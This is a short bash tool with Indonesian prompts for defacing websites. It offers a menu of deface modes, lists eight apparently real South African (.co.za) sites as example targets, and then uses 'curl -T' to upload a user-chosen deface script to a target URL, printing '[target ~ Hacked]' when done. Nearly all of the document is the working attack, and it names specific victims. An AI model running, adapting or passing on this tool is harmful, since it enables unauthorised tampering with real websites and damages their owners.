  
green="\033[32;1m"
yellow="\033[33;1m"
indigo="\033[34;1m"
red="\033[35;1m"
purple="\033[37;1m"
cyan="\033[36;1m"
white="\033[39;1m"

echo $green
figlet BP
echo $cyan
echo ----------------------------------------------
echo 1 Deface Biasa
echo 2 Deface Dengan SC Deface BP
echo 3 Install Paket
echo ----------------------------------------------
echo  Jawabanmu:
read f
if [ $f = "1" ]
then
clear
fi

if [ $f = "2" ]
then 
sh b.sh
exit
fi

if [ $f = "3" ]
then 
sh c.sh
exit
fi


clear
echo $green
echo Simpan SC Di Memory Internal Di Luar Folder
echo Contoh Target:
echo $red
echo "http://colourfactory.co.za"          
echo $cyan 
echo "http://chillibitez.co.za"
echo $red
echo "http://centraltech.co.za"
echo $cyan
echo "http://windmillsandporcupines.co.za"
echo $red
echo "http://mpark.co.za"
echo $cyan
echo "http://ratia.co.za "
echo $red
echo "http://itsengineering.co.za new"
echo $cyan
echo "http://uzingela.co.za new"
echo $green
echo eksekusi target
read -p "Target=>"  target
clear
echo Simpan SC Di Memory Internal Di Luar Folder
echo $red
read -p "Nama Script=>"  script
echo $cyan
echo loading..
cd /sdcard
curl -T $script $target
echo $red
echo [$target ~ Hacked]
echo terimakasih $ta telah menggunakan tools ini 
